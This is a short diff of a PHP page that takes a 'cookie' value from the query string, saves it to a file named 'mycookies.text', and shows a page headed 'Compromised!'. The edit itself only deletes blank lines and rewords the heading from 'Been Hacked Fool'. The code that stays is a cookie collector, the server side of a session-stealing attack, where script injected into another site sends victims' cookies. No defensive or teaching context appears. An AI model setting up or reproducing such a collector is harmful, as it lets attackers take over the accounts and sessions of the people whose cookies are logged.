@@ -1,19 +1,7 @@
 <?php
-
-
 $cookie = $_GET['cookie'];
-
-
 file_put_contents('mycookies.text', $cookie);
-
-
-
 ?>
-
-
-
-
-
 
 <!doctype html>
 <html lang="en">
@@ -24,7 +12,7 @@ file_put_contents('mycookies.text', $cookie);
 <body>
 
 
-    <h1>Been Hacked Fool</h1>
+    <h1>Compromised!</h1>
 
 
 </body>
